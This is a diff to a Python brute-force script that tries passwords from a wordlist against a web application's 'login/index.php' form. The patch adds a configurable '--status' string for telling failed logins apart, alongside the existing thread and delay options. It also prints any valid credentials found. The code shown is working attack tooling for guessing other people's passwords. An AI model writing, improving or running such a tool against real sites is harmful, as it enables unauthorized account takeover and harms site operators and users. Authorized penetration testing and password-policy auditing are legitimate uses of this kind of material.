@@ -25,7 +25,7 @@ def brute(url, delay, passwords):
 			sys.exit(1)
 		try:
 			r = requests.post(f'{url}login/index.php', data={'username': args.login, 'password': password})
-			loggedin = 'You are not logged in' not in r.text
+			loggedin = args.status not in r.text
 			if loggedin:
 				print(f'(\033[92mSuccess\033[0m): Valid Credentials \"{args.login}\" \"{password}\"')
 			time.sleep(delay/1000)
@@ -81,6 +81,7 @@ if __name__ == '__main__':
 	parse.add_argument('-p', '--password', type=str, required=True, help='password list file')
 	parse.add_argument('-t', '--threads', type=int, default=2, help='number of threads to use. default: %(default)s')
 	parse.add_argument('-D', '--delay', type=int, default=25, help='request delay (ms). default: %(default)s')
+	parse.add_argument('-s', '--status', type=str, default='You are not logged in', help='status string returned by the server on UNSUCCESSFUL attempts. default: "%(default)s"')
 
 	banner()
 	args = parse.parse_args()
